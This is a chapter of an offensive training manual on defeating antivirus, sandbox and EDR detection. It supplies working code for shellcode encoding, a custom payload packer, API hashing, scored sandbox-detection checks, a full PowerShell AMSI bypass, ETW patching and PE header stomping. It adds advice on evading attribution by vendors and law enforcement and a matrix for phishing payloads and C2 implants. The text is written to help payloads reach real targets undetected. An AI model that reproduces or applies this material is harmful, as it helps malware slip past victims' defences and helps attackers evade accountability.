# Chapter 12 — AV Evasion: Signatures, Heuristics & Sandboxes

**VADER-RCE Field Manual**
**Prerequisite**: Ch10 (Code Injection), Ch11 (Rootkits), basic PE structure knowledge
**Drill**: DRILLS/12_av_evasion/

---

## Why You Need This

You built a payload. It works in your lab. You drop it on the target
and Windows Defender kills it in 4 seconds. Back to zero.

AV evasion is not about being smarter than an AV engine. It's about
understanding what the engine is checking, then not being that thing.
AV engines are detection SYSTEMS — layers stacked on layers. Each layer
looks for a different class of signal. You need to understand each layer
separately.

This is not a collection of tricks. Tricks become stale as signatures
update. This is a model of how detection works so you can understand
why ANY evasion technique works or fails, and reason about new ones.

The model: five layers. Each layer is a gate. Pass all five gates and
your payload runs. Fail any gate and it's over.

```
GATE 1: STATIC SIGNATURE    — match file bytes against known-bad patterns
GATE 2: HEURISTIC           — static code analysis, suspicious structures
GATE 3: BEHAVIOURAL         — monitor what the binary DOES when run
GATE 4: SANDBOX             — run in an isolated VM, observe full behavior
GATE 5: EDR TELEMETRY       — kernel hooks, ETW, process tree analysis
```

Each gate has different evasion vectors. Work the model. Pick your gates.

---

## Section 1 — AV Detection Layers

### Layer 1: Static Signature Matching

```
What it does:
    Computes a hash of the file (MD5, SHA256) and checks a database.
    OR: scans byte sequences within the file against a pattern database.
    OR: checks for known strings, PE metadata, resource hashes.

Pattern example:
    Defender signature for Meterpreter:
        Byte pattern at offset X: FC 48 83 E4 F0 E8 C8 00 00 00 41 51
        This is the x64 Meterpreter shellcode prologue.
        Present in file → ALERT.

Speed: very fast (milliseconds)
Cost to evade: low (single-byte change, re-encoding, packing)
Permanence of evasion: low (vendor updates signature within days)
```

### Layer 2: Heuristic / Static Analysis

```
What it does:
    Disassembles or interprets the code without running it.
    Looks for suspicious patterns:
        — API call sequences (VirtualAlloc + WriteProcessMemory + CreateRemoteThread)
        — Unusual PE structures (no sections, packed entropy, hidden .text)
        — Code that dynamically resolves APIs at runtime
        — Encrypted or obfuscated strings
        — Code that XORs memory regions before calling them
        — PE imports of only a few functions (typical of packed malware)
        — High entropy throughout file (encrypted/compressed)

Speed: medium (seconds)
Cost to evade: medium (requires restructuring code or API patterns)
Permanence of evasion: medium (heuristic rules are harder to update than sigs)
```

### Layer 3: Behavioural Monitoring

```
What it does:
    Runs the binary and monitors what it does.
    API hooks in userland (NTDLL hooks, Win32 API hooks).
    Kernel callbacks (PsSetCreateProcessNotifyRoutine etc.).
    ETW (Event Tracing for Windows) telemetry.

Looks for:
    — Process creating remote threads in other processes
    — Process writing to another process's memory
    — Process spawning cmd.exe, powershell.exe as children
    — Unusual network connections
    — Registry writes to persistence keys
    — Unusual token manipulation (SeDebugPrivilege enabling, impersonation)

Speed: real-time
Cost to evade: high (must avoid known-bad behavioral patterns entirely)
Permanence of evasion: medium-high (behavioral rules are broad, harder to
                                    evade without fundamental redesign)
```

### Layer 4: Sandbox Analysis

```
What it does:
    Executes the file in an isolated VM.
    Observes ALL behavior for N seconds (usually 60-300 seconds).
    Records API calls, network connections, file writes, registry changes.
    Compares against known-malicious behavioral profiles.

Examples: Cuckoo Sandbox, Any.run, Windows Sandbox, Defender's sandbox

Evading sandbox requires:
    — Detecting you're IN a sandbox and not executing payload
    — Exhausting the time limit before behaving maliciously
    — Requiring human interaction (sandbox can't simulate real user)
    — Requiring environment properties that sandboxes typically lack
```

### Layer 5: EDR (Endpoint Detection and Response)

```
What it does:
    Full kernel visibility via registered callbacks, ETW, and AMSI.
    Process lineage tracking (who spawned who).
    Memory scanning (scheduled scans + on-access hooks).
    Network flow analysis.
    Cross-process correlation (implant calls out, correlate with source).

Cannot be entirely evaded in a default EDR-protected environment without:
    — Kernel-level rootkit (Ch11)
    — AMSI bypass
    — ETW patching
    — Behavioral design that avoids all flagged patterns
```

---

## Section 2 — Static Evasion: Obfuscation & Encoding

### Byte-Level Obfuscation

The simplest possible evasion. The signature matches a specific byte
sequence. Change the bytes. The signature no longer matches.

```c
// Original shellcode (detected):
unsigned char shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, ...
};

// XOR encoded version (not detected):
unsigned char key = 0x42;
unsigned char encoded[] = {
    0xFC ^ 0x42, 0x48 ^ 0x42, 0x83 ^ 0x42, ...
    // stored as different bytes, decoded at runtime
};

// Runtime decoder (must itself be clean):
void decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}
```

XOR alone is trivially detected by modern AV. The decoding loop itself
becomes a detection pattern. The key is not secret (it's in the binary).
Use it as a starting point, not an endpoint.

### Polymorphic Shellcode

Same payload, different bytes every run. The decoding stub changes.
The key changes. The padding changes. The hash is different every time.

```python
import os, struct

def polymorphic_encode(shellcode: bytes) -> bytes:
    key = os.urandom(32)  # random 32-byte key, different every build

    # Multi-byte XOR with rolling key
    encoded = bytearray()
    for i, b in enumerate(shellcode):
        encoded.append(b ^ key[i % len(key)])

    # Generate decoding stub with embedded key (stub also randomised
    # by inserting NOPs and register-equivalent instruction substitutions)
    stub = generate_stub(key)
    return stub + bytes(encoded)

def generate_stub(key: bytes) -> bytes:
    # Emit NASM assembly with key embedded
    # Randomise register choices between r10/r11/r12 etc. each build
    # Insert random NOP equivalents (XCHG rax,rax; MOV r,r; etc.)
    # Compile and return bytes
    ...
```

Polymorphism at the byte level defeats hash-based detection and defeats
pattern-based detection (if the stub itself varies). Heuristics still
apply — the decoding loop is still recognisable as a decoding loop.

### Metamorphism

Harder. Not just encoding the payload — rewriting the code itself so
the LOGIC is the same but the INSTRUCTIONS are different.

```
Instruction substitution:
    mov rax, 0        →    xor rax, rax
    add rax, 5        →    inc rax; inc rax; inc rax; inc rax; inc rax
    jmp label         →    push label; ret
    push rax          →    sub rsp, 8; mov [rsp], rax

Junk code insertion:
    Real instruction
    jmp SKIP_JUNK
    JUNK: db 0xCC, 0x90, 0x31, ...  ; unreachable bytes
    SKIP_JUNK:
    Next real instruction

Code transposition:
    Block A; Block B; Block C
    →
    Block C; jmp NEXT1
    Block A; jmp NEXT2
    Block B; (fall through)
    NEXT2: ...
    NEXT1: ...
    (Logically identical execution order, different binary layout)
```

Metamorphic engines are complex. Off-the-shelf metamorphic packers
exist but their unpacker stubs are themselves detected. Writing your
own requires serious investment. Pays off if you're building a tool
for long-term use.

### Packing & Custom Packers

A packer compresses or encrypts the payload, wraps it in a stub that
decrypts and executes it at runtime. The packed binary has a different
hash and different byte patterns than the original.

```
PACKING PIPELINE:
    Original PE
        │
        ▼
    Compressor/Encryptor (zlib, AES, XOR cascade)
        │
        ▼
    Stub PE (unpacker code + encrypted original as resource)
        │
        ▼
    Stub runs, decrypts original into new memory region, jumps to it

COMMERCIAL/KNOWN PACKERS (all detected by AV):
    UPX — adds UPX signature, trivially detected
    MPRESS — detected
    Themida/WinLicense — heavy, detected by their own signatures
    VMProtect — detected by structural patterns of VM-based obfuscation

BETTER: write your own minimal packer.
The stub is the only part on disk. If the stub is clean and short,
and uses benign-looking code patterns, detection drops significantly.
```

Custom packer stub example (concept):

```c
// Packed binary resource: encrypted_payload[] embedded in .rsrc
// Stub executes this:

#include <windows.h>

// payload is embedded as a resource or in a data section
extern unsigned char encrypted_payload[];
extern DWORD payload_size;
extern BYTE aes_key[32];
extern BYTE aes_iv[16];

int WINAPI WinMain(HINSTANCE h, HINSTANCE prev, PSTR cmd, int show) {
    // Allocate RWX region
    PVOID buf = VirtualAlloc(NULL, payload_size,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);

    // Decrypt payload into buffer
    AES_CBC_decrypt(encrypted_payload, payload_size, aes_key, aes_iv, buf);

    // Execute
    ((void(*)())buf)();
    return 0;
}
```

This stub has two detection vectors:
1. The decryption call (AES library code patterns)
2. The VirtualAlloc + execute pattern

Both are flagged by heuristics. You need to address these too (see Section 3).

---

## Section 3 — Heuristic Evasion

### API Call Pattern Reduction

Heuristics flag suspicious API sequences. Don't use the flagged API.
Use a lower-level alternative.

```
FLAGGED PATTERN:
    VirtualAlloc(MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    → memcpy(buf, shellcode, len)
    → CreateThread(buf)

ALTERNATIVES:
    VirtualAlloc RW → VirtualProtect to RX (two-step, less flagged)
    NtAllocateVirtualMemory directly (syscall, bypasses Win32 hooks)
    HeapCreate(HEAP_CREATE_ENABLE_EXECUTE) + HeapAlloc (unusual but works)
    MapViewOfFile into a file-backed mapping (low suspicion, executable mapping)

FLAGGED PATTERN:
    OpenProcess(ALL_ACCESS)
    + WriteProcessMemory
    + CreateRemoteThread

ALTERNATIVES:
    APC injection (no CreateRemoteThread)
    Thread hijacking (no new thread creation)
    Kernel injection via driver (no user-mode calls at all)
```

### Entropy Reduction

High entropy = encrypted/compressed data. AV flags high-entropy sections.

```
ENTROPY MEASUREMENT:
    Shannon entropy: H = -Σ P(x) * log2(P(x))
    Random bytes / AES ciphertext: ~8.0 bits (maximum entropy)
    Normal code (.text section): 5.0-6.5 bits
    Normal text data: 4.0-5.0 bits

ENTROPY REDUCTION TECHNIQUES:
    1. Padding: add null bytes or low-entropy patterns between high-entropy chunks
       Breaks up the high-entropy region into smaller chunks with gaps.

    2. Substitution dictionary:
       Instead of raw ciphertext (entropy ~8.0), use a lookup table
       that maps 1-byte values to 2-byte combinations drawn from a
       known-benign dictionary. Ciphertext stored as dictionary indices.
       Entropy drops dramatically. Decoder translates back at runtime.

    3. Store encrypted payload in a resource or as a text file
       with Base64-like encoding (printable character set, lower entropy).

    4. Compress before encrypting:
       Compression reduces entropy BEFORE encryption step.
       Compressed-then-encrypted data is only marginally higher entropy
       than compressed data alone — because the encryption of low-entropy
       compressed output is harder to distinguish from random.
       (This is marginal — AES of any input looks like random output.)
```

### Import Table Cleanup

A binary that imports only `VirtualAlloc`, `WriteProcessMemory`,
`CreateRemoteThread`, and `LoadLibraryA` looks like a loader.
That's a heuristic hit.

```c
// BAD: imports declare exactly what you're doing
#include <windows.h>
// Linker sees: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
// AV heuristic: classic injection imports

// BETTER: dynamic resolution at runtime
// Import table only shows GetProcAddress and LoadLibraryA (boring, universal)

typedef LPVOID (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

pfnVirtualAlloc p_VirtualAlloc = (pfnVirtualAlloc)
    GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");

// Even better: obfuscate the string "VirtualAlloc"
// XOR the string, decode at runtime:
unsigned char va_name[] = { 0x56^0x01, 0x69^0x01, ... }; // "VirtualAlloc" XORed
decode(va_name, sizeof(va_name), 0x01);
pfnVirtualAlloc p_VA = (pfnVirtualAlloc)GetProcAddress(..., (char*)va_name);
```

### API Hashing

Instead of storing function names as strings, store their hashes.
Walk the export table, hash each name, compare.

```c
// djb2-style hash function
DWORD hash_str(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) ^ (DWORD)*s++;
    return h;
}

// Walk export table, find function by hash
PVOID find_export_by_hash(HMODULE mod, DWORD target_hash) {
    IMAGE_NT_HEADERS *nt = (void*)((BYTE*)mod + *(DWORD*)((BYTE*)mod + 0x3C));
    IMAGE_EXPORT_DIRECTORY *exp = (void*)((BYTE*)mod
        + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names   = (DWORD*)((BYTE*)mod + exp->AddressOfNames);
    WORD  *ordinals = (WORD*) ((BYTE*)mod + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((BYTE*)mod + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)mod + names[i]);
        if (hash_str(name) == target_hash) {
            WORD ordinal = ordinals[i];
            return (PVOID)((BYTE*)mod + funcs[ordinal]);
        }
    }
    return NULL;
}

// Usage: no string "VirtualAlloc" anywhere in the binary
// HASH_VIRTUALALLOC = 0xXXXXXXXX (precomputed)
pfnVirtualAlloc pVA = find_export_by_hash(
    GetModuleHandleA("kernel32.dll"), HASH_VIRTUALALLOC
);
```

---

## Section 4 — Sandbox Evasion

### How Sandboxes Work

```
SANDBOX ARCHITECTURE:
    Isolated VM with monitoring agents:
        — API hooking (all Win32 calls logged)
        — Network interception (all traffic captured and analysed)
        — File system monitoring (all reads/writes logged)
        — Registry monitoring
        — Screenshot capture (detect visual indicators)

    Limitations:
        — Runs for finite time (60-300 seconds typically)
        — No real user input (mouse, keyboard, actual applications)
        — Virtual hardware (HyperV, VirtualBox, VMware)
        — Limited process history (no real user data in profile)
        — Artificial environment (screen res, CPU count, installed software)
```

### Timing Attacks

Sleep past the sandbox timeout:

```c
// Sandbox typically runs for 60-300 seconds
// Sleep past the window before doing anything malicious

Sleep(600000);  // 10 minutes

// PROBLEM: Most sandboxes accelerate Sleep() calls.
// They hook the Sleep function and return immediately.
// Your 10-minute sleep becomes 0.
// Detection: you slept for 10 minutes of "wall clock" but
// the real elapsed time is zero seconds.

// BETTER: time verification
DWORD start = GetTickCount();
Sleep(600000);  // supposed to be 10 minutes
DWORD elapsed = GetTickCount() - start;

if (elapsed < 590000) {
    // Sleep was accelerated — we're in a sandbox
    // Don't execute payload
    ExitProcess(0);
}

// If we get here, 10 minutes actually passed — probably real system
execute_payload();
```

### Non-Sleep Timing

Sandboxes that accelerate Sleep() may NOT accelerate all time sources:

```c
// Method 1: RDTSC instruction (CPU timestamp counter)
// Sandboxes often accelerate system time but not RDTSC
UINT64 tsc_start = __rdtsc();

// Burn real CPU time in a loop that looks benign
volatile DWORD sink = 0;
for (DWORD i = 0; i < 0xFFFFFF; i++) sink += i;

UINT64 tsc_end = __rdtsc();
UINT64 elapsed_cycles = tsc_end - tsc_start;

// On real hardware at ~3GHz: 0xFFFFFF iterations ≈ several million cycles
// If elapsed_cycles is near-zero, RDTSC is being spoofed or accelerated
if (elapsed_cycles < 1000000) {
    ExitProcess(0);  // sandbox detected
}

// Method 2: GetSystemTimeAsFileTime before and after work
FILETIME ft1, ft2;
GetSystemTimeAsFileTime(&ft1);
for (volatile DWORD i = 0; i < 10000000; i++);
GetSystemTimeAsFileTime(&ft2);

ULARGE_INTEGER t1 = { ft1.dwLowDateTime, ft1.dwHighDateTime };
ULARGE_INTEGER t2 = { ft2.dwLowDateTime, ft2.dwHighDateTime };
// If delta is < 1 second for 10M iterations, time is accelerated
if ((t2.QuadPart - t1.QuadPart) < 10000000) ExitProcess(0);
```

### User Interaction Checks

Sandboxes cannot simulate a real user. Check for evidence of human presence.

```c
// Check cursor movement
POINT pt1, pt2;
GetCursorPos(&pt1);
Sleep(5000);
GetCursorPos(&pt2);

// Real user: cursor has moved. Sandbox: cursor is static.
if (pt1.x == pt2.x && pt1.y == pt2.y) {
    // No cursor movement in 5 seconds — likely sandbox
    ExitProcess(0);
}

// Check for clicks (user interaction)
LASTINPUTINFO lii = { sizeof(lii) };
GetLastInputInfo(&lii);
DWORD idle_ms = GetTickCount() - lii.dwTime;

// If system has been idle for more than 5 minutes, suspicious
if (idle_ms > 300000) ExitProcess(0);

// Check recent foreground window count
// A real user's system has many window activations over time
// Sandbox typically has almost none
```

### Screen Resolution Check

Sandboxes often run at minimal resolution to save resources.

```c
int width  = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);

// Any modern real monitor: at least 1024x768
// Sandbox VMs often: 800x600 or 1024x600
if (width < 1024 || height < 768) {
    ExitProcess(0);
}
```

### Process Count Check

A freshly-booted sandbox has very few running processes. A real user's
machine has dozens.

```c
// Count running processes
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe = { sizeof(pe) };
DWORD count = 0;

if (Process32First(snap, &pe)) {
    do { count++; } while (Process32Next(snap, &pe));
}
CloseHandle(snap);

// Real system: typically 50-150+ processes
// Minimal sandbox: 20-40 processes
if (count < 50) {
    ExitProcess(0);
}
```

### CPUID Hypervisor Bit

The CPUID instruction returns CPU feature flags. Bit 31 of ECX with
CPUID leaf 1 is the hypervisor present bit. Virtualisation platforms
(VMware, VirtualBox, Hyper-V) set this bit.

```c
// Execute CPUID leaf 1
int cpu_info[4];
__cpuid(cpu_info, 1);

// Bit 31 of ECX (cpu_info[2]) = hypervisor present
if (cpu_info[2] & (1 << 31)) {
    // Running under a hypervisor
    // Not necessarily a sandbox — Hyper-V is common on dev machines —
    // but combine with other checks for confidence

    // Additional: CPUID leaf 0x40000000 returns hypervisor vendor string
    __cpuid(cpu_info, 0x40000000);
    char vendor[13];
    memcpy(vendor,     &cpu_info[1], 4);
    memcpy(vendor + 4, &cpu_info[2], 4);
    memcpy(vendor + 8, &cpu_info[3], 4);
    vendor[12] = 0;

    // vendor strings:
    // "VMwareVMware" = VMware
    // "VBoxVBoxVBox" = VirtualBox
    // "Microsoft Hv" = Hyper-V
    // "KVMKVMKVM" = KVM (Linux VMs)
    if (strcmp(vendor, "VMwareVMware") == 0 ||
        strcmp(vendor, "VBoxVBoxVBox") == 0) {
        ExitProcess(0);
    }
}
```

**NOTE**: Blindly checking the hypervisor bit and bailing is bad operational
practice. Many real corporate endpoints run under Hyper-V (WSL, Credential
Guard, HVCI). Combine multiple indicators. Set a threshold. If 3+ sandbox
signals present → exit. If only the hypervisor bit → continue.

### Combining Sandbox Checks

```c
int sandbox_score = 0;

// Timing check
if (check_sleep_acceleration()) sandbox_score += 3;

// User interaction
if (check_cursor_movement() == 0) sandbox_score += 2;

// Screen resolution
if (GetSystemMetrics(SM_CXSCREEN) < 1024) sandbox_score += 1;

// Process count
if (get_process_count() < 50) sandbox_score += 2;

// CPUID hypervisor (VMware/VirtualBox specific)
if (check_vmware_vbox()) sandbox_score += 3;

// Decision threshold
if (sandbox_score >= 5) {
    // High confidence: sandbox environment
    // Option 1: exit silently
    ExitProcess(0);
    // Option 2: run benign code instead
    run_decoy_behavior();
}

execute_payload();
```

---

## Section 5 — AMSI Bypass

AMSI (Antimalware Scan Interface) is a Windows API that allows AV vendors
to inspect scripts and other dynamic content at runtime. PowerShell, VBA
macros, JScript, .NET code — all pass through AMSI before execution.

Defender is the default AMSI provider. It scans the buffer content.
If your PowerShell script contains known-bad strings, AMSI kills it
before it runs. Bypassing AMSI means your script runs clean.

### How AMSI Works

```
PowerShell script execution:
    PowerShell reads script
        │
        ▼
    AmsiScanBuffer(amsi_context, buffer, length, "PowerShell", ...)
        │
        ▼
    amsi.dll calls registered AV providers (via COM)
        │
        ▼
    Provider scans buffer
        │
        ▼
    Returns AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED
        │
        ▼
    PowerShell executes or blocks based on result
```

### AMSI Bypass: Patch AmsiScanBuffer

```powershell
# Classic AMSI bypass — patch amsi.dll!AmsiScanBuffer to return clean
# This works in an unprotected PowerShell session
# EDRs have signatures for this exact byte pattern now

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$hModule = [Win32]::LoadLibrary("amsi.dll")
$ptr = [Win32]::GetProcAddress($hModule, "AmsiScanBuffer")

$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
# mov eax, 0x80070057 (E_INVALIDARG) ; ret
# AmsiScanBuffer returns error immediately → AMSI_RESULT_CLEAN by default

$oldProtect = 0
[Win32]::VirtualProtect($ptr, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null

[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
[Win32]::VirtualProtect($ptr, [uint32]5, $oldProtect, [ref]$oldProtect) | Out-Null
```

### AMSI Bypass: Corrupt amsi.dll Context

```powershell
# Alternative: corrupt the amsiContext structure
# amsiContext is a pointer passed to AmsiScanBuffer
# If the first DWORD is not "AMSI", the function returns early

# Find amsiContext in memory and zero it out
# More reliable against simple signature matching on the patch bytes
```

### Avoiding AMSI Detection of Bypass Strings

The bypass code itself contains strings that AMSI detects:
- "AmsiScanBuffer"
- "amsi.dll"
- The specific patch bytes

Obfuscate the bypass code before it runs:

```powershell
# String concatenation (trivial, often still caught)
$s = "Amsi" + "ScanBuffer"

# Base64 encode the entire bypass, decode and execute
$b64 = "BASE64_ENCODED_BYPASS_CODE_HERE"
IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)))
# IEX itself is flagged — use the Invoke-Expression alias or reflection

# Reflection-based approach (avoids IEX)
$scriptBlock = [scriptblock]::Create([System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String($b64)
))
& $scriptBlock
```

### AMSI in .NET

```csharp
// For .NET execution (not PowerShell), AMSI hooks via CLR events
// AmsiScanBuffer is called before assembly load

// Bypass: patch amsi.dll from within the .NET process (same approach)
// OR: use Assembly.Load(byte[]) with encrypted payload
// OR: reflective assembly loading that bypasses CLR load events

// Example: load assembly from encrypted byte array
byte[] encryptedAssembly = ...; // from resource or network
byte[] key = ...;
byte[] assemblyBytes = Decrypt(encryptedAssembly, key);

// Patch AMSI first, then load
PatchAmsi();
Assembly.Load(assemblyBytes).EntryPoint.Invoke(null, null);
```

---

## Section 6 — ETW Patching

ETW (Event Tracing for Windows) is the kernel's high-speed logging
framework. EDRs subscribe to ETW providers for near-realtime visibility:
process creation, thread creation, memory allocation, API calls (via
user-mode ETW providers in ntdll).

The ETW provider in ntdll.dll has an event write function. Patch it
to return immediately → no ETW events → EDR loses visibility.

### How ETW Logging Works

```
Code calls VirtualAlloc()
    │
    ▼
Kernel32.VirtualAlloc calls NtAllocateVirtualMemory
    │
    ▼
ntdll!EtwEventWrite() called to log the allocation
    │
    ▼
ETW infrastructure delivers event to all subscribers
    │
    ▼
EDR's ETW session receives: "PID X allocated RWX memory at addr Y"
```

### Patching EtwEventWrite

```csharp
// .NET / C# approach
private static void PatchETW() {
    // Get address of ntdll!EtwEventWrite
    IntPtr hNtdll = LoadLibrary("ntdll.dll");
    IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    // Patch with: ret (just return immediately, log nothing)
    byte[] patch = new byte[] { 0xC3 }; // RET

    // Make writable, patch, restore protection
    VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out uint old);
    Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
    VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, old, out old);
}
```

PowerShell version:

```powershell
$ntdll = [System.Reflection.Assembly]::LoadWithPartialName("ntdll")
# ... same VirtualProtect + Marshal.Copy pattern as AMSI bypass
# Patch EtwEventWrite with 0xC3 (ret)
```

**Caveat**: This only kills ETW events originating FROM YOUR PROCESS.
Kernel-mode ETW events (from kernel callbacks registered by the EDR driver)
are not affected. You blind the userland telemetry channel, not the kernel one.

---

## Section 7 — PE Header Stomping

After a PE image loads into memory, the PE headers (MZ signature,
IMAGE_NT_HEADERS, section table) are technically no longer needed for
execution. They're needed for tools that parse the module list. Overwrite
them with zeros and you partially defeat in-memory scanning tools.

```c
// After loading your payload:
PVOID payload_base = ...; // base address of loaded PE

// Overwrite first 0x1000 bytes (headers + start of .text)
DWORD old;
VirtualProtect(payload_base, 0x1000, PAGE_EXECUTE_READWRITE, &old);
memset(payload_base, 0, 0x1000);
VirtualProtect(payload_base, 0x1000, old, &old);

// MZ signature gone → malfind won't match PE header pattern
// IMAGE_NT_HEADERS gone → ParsePeHeaders fails on this region
// The code still runs — execution is already past the header stage
```

**What this defeats:**
- YARA rules scanning for MZ/PE signature in executable memory
- Volatility `malfind` PE header detection
- Tools that enumerate loaded images by looking for MZ in executable regions

**What this does NOT defeat:**
- EDR that logged the original load event (it already saw the PE)
- Memory scanner that compares the running image to the on-disk version
  (missing headers are themselves suspicious)
- Pool tag scan for EPROCESS (for process-level hiding, need DKOM)

---

## Section 8 — String Obfuscation

Strings in binaries are a goldmine for static analysis. "cmd.exe",
"powershell.exe", "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
— each one is a detection signal. Don't store them as plaintext.

### XOR String Encoding

```c
// At compile time: store encoded strings
// "cmd.exe\0" XORed with 0xAA:
unsigned char enc_cmd[] = {
    'c'^0xAA, 'm'^0xAA, 'd'^0xAA, '.'^0xAA,
    'e'^0xAA, 'x'^0xAA, 'e'^0xAA, '\0'^0xAA
};

// At runtime: decode into local buffer
char cmd_str[16];
for (int i = 0; i < sizeof(enc_cmd); i++) {
    cmd_str[i] = enc_cmd[i] ^ 0xAA;
}
// cmd_str is now "cmd.exe" — but only exists as a string at runtime
// The plaintext string never appears in the binary
```

### Stack Strings

More complex: build the string on the stack at runtime, character by character.
No string exists anywhere in the binary, not even encoded.

```c
// "powershell.exe" as stack string
// No string in binary — compiler cannot string-search it
char ps[20];
ps[0]  = 'p'; ps[1]  = 'o'; ps[2]  = 'w'; ps[3]  = 'e';
ps[4]  = 'r'; ps[5]  = 's'; ps[6]  = 'h'; ps[7]  = 'e';
ps[8]  = 'l'; ps[9]  = 'l'; ps[10] = '.'; ps[11] = 'e';
ps[12] = 'x'; ps[13] = 'e'; ps[14] = '\0';

// ShellString macro approach:
#define STR_POWERSHELL \
    char _s[] = {'p','o','w','e','r','s','h','e','l','l','.','e','x','e',0}
```

### String Macro (LLVM/Clang obfuscation)

LLVM's obfuscation passes or the Clang-based Hikari obfuscator can
automatically apply string encryption to ALL strings in a compilation
unit. Each string gets a unique key, encoded at compile time, decoded
at runtime via a generated stub. No manual work per string.

```
# Compile with Hikari LLVM:
clang -mllvm -enable-bcfobf \
      -mllvm -enable-strcry \
      -mllvm -enable-indibran \
      payload.c -o payload.exe

# -enable-strcry: automatic string encryption for all string literals
# Result: all strings encrypted, decoded on first access
```

---

## Section 9 — VirusTotal OPSEC

This is the most important rule in this entire chapter.

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   NEVER UPLOAD A LIVE PAYLOAD TO VIRUSTOTAL.                    ║
║                                                                  ║
║   NEVER. NOT ONCE. NOT "JUST TO CHECK."                        ║
║   NOT WITH A VPN. NOT WITH A THROWAWAY ACCOUNT.                ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

Why:

```
1. VirusTotal shares samples with ALL subscribing AV vendors.
   Your payload is distributed to every major AV company within minutes.
   A signature will exist for your payload within 24-48 hours.
   Your payload is burned. Permanently.

2. Law enforcement and national intelligence agencies have full
   VirusTotal access. Uploaded samples are correlated with:
   — Upload IP addresses (even through VPN if the VPN leaks)
   — Metadata (compilation timestamps, PDB paths, usernames in paths)
   — Similar samples (cluster analysis links your payload to other ones)

3. VT has deep integrations. If your payload targets infrastructure
   owned by a company with VT Enterprise access, your upload
   triggers a direct notification to their security team.
```

### Testing Without VirusTotal

```
LOCAL TESTING (no sharing, no burn):
    Windows Defender only:
        PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true
        Test with Defender re-enabled after specific changes.

    Offline multi-AV scan:
        Install 2-3 AVs on an isolated VM with no internet access.
        Snapshot before, test, revert.

    Defender ATP sample submission (internal to your tenant):
        Enterprise-only. Samples stay within your tenant.
        Not VirusTotal.

ONLINE TESTING (limited, controlled):
    Antiscan.me — does NOT share with AV vendors (verify current policy)
    Kleenscan — claims not to share (verify current policy)
    Hybrid Analysis (app.any.run) — public submissions ARE shared
        — Only use private/paid tier if operational

BEHAVIOURAL TESTING (no static analysis):
    Any.run (private session) — dynamic sandbox, controlled sharing
    Cuckoo local — self-hosted, nothing leaves your network

METADATA STRIPPING before any external test:
    Remove PDB paths:
        Link with /PDB:NONE or strip with objcopy/llvm-strip
    Strip compilation timestamps:
        Set SOURCE_DATE_EPOCH before compiling
    Remove author/company strings from PE resources
    Remove any absolute paths that reveal your username or directory structure
```

---

## Section 10 — Consolidated Evasion Decision Matrix

Match your payload delivery context to the right evasion stack.

```
SCENARIO 1: Phishing email attachment (doc/pdf/exe)
    Gate 1 (static): Custom packer + polymorphic stub + cleaned imports
    Gate 2 (heuristic): Dynamic API resolution + entropy reduction
    Gate 3 (behavioural): APC/early-bird injection, no CreateRemoteThread
    Gate 4 (sandbox): Timing checks + user interaction + CPUID
    Gate 5 (EDR): AMSI patch, ETW patch if using .NET/PS, syscalls for alloc

SCENARIO 2: PowerShell payload delivery (post-phish, already in PS)
    Gate 1 (static): Base64 encoding + string obfuscation
    Gate 2 (heuristic): Amsi bypass before any other code
    Gate 3 (behavioural): Avoid invoke-expression, use reflection
    Gate 4 (sandbox): PS doesn't run in sandbox often (script-level)
    Gate 5 (EDR): ETW patch + avoid LOLBins that are heavily monitored

SCENARIO 3: Compiled C2 implant on endpoint
    Gate 1 (static): Full custom packer, no plaintext strings, high entropy fix
    Gate 2 (heuristic): All Win32 via syscalls (SysWhispers), no import table
    Gate 3 (behavioural): Beacon over HTTPS, blend traffic with host process
    Gate 4 (sandbox): Full sandbox detection suite
    Gate 5 (EDR): Kernel driver for visibility, or BYOVD approach

SCENARIO 4: Post-exploitation (already running, persistence)
    Gate 1-2 (static/heuristic): Payload already running — not relevant
    Gate 3 (behavioural): Avoid high-signal APIs, use syscalls, hollow processes
    Gate 4 (sandbox): Not applicable for post-exploitation context
    Gate 5 (EDR): PE header stomp, ETW patch, limit process creation
```

---

## Key Terms

| Term | Definition |
|------|-----------|
| **Static signature** | Byte pattern or hash matched against a file without executing it |
| **Heuristic analysis** | Static inspection of code structure and API usage patterns to detect suspicious behavior |
